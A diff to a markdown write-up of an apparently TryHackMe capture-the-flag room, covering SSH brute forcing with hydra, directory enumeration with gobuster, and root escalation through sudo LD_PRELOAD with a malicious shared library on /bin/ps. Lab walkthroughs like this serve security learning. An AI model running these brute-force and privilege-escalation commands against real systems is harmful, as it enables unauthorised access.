@@ -20,7 +20,7 @@ PORT     STATE SERVICE
 ```bash
 hydra -L users.txt -P /usr/share/wordlists/rockyou.txt -f -o hydra_ssh.txt -u IP_ADDRESS -s 22 ssh
 ```
-- Performed mannual enumeration. Found `/team` `/services` `/wow` pages
+- Performed mannual enumeration. Found `/team` `/services` `/wow` and other game pages
 - Used `gobuster` to find more directories and files `gobuster dir -u http://IP_ADDRESS:80 -w /usr/share/wordlists/rockyou.txt -o gobuster.txt`
   - Found `/admin`
   - Accessed the cURL request for `/admin` page
@@ -40,6 +40,8 @@ jed
 > cat /home/jed/user.txt
 THM{some-gibberish}
 # linpeas didn't work completely, but revealed [LD_PRELOAD](../LinuxTexhniques/LD_PRELOAD.md) as a possible escalation method
+> sudo -l
+# found that `jed` can run `/bin/ps` with `LD_PRELOAD` env variable
 # exec the shared lib injection attack for `/bin/ps` and got root shell
 > sudo LD_PRELOAD=./evil.so /bin/ps
 > whoami
